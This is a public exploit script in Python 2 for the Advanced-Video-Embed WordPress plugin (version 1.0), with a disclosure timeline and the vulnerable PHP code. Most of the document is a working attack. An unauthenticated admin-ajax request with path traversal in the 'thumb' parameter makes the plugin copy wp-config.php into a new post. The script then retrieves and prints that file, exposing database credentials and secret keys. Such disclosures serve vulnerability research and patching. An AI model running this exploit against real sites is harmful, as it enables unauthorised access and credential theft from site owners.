#!/usr/bin/env python

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

#	Timeline
#	03/24/2016 - Bug discovered
#	03/24/2016 - Initial notification of vendor
#	04/01/2016 - No answer from vendor, public release of bug 


# Vulnerable Code (/inc/classes/class.avePost.php) Line 57:

#  function ave_publishPost(){
#    $title = $_REQUEST['title'];
#    $term = $_REQUEST['term'];
#    $thumb = $_REQUEST['thumb'];
# <snip>
# Line 78:
#    $image_data = file_get_contents($thumb);


# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

import random
import urllib2
import re

url = "https://192.168.56.101/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
	numbers = re.findall(r'\d+',line)
	id = numbers[-1]
	id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
		urls=re.findall('"(https?://.*?)"', line)
		print urllib2.urlopen(urls[0]).read()
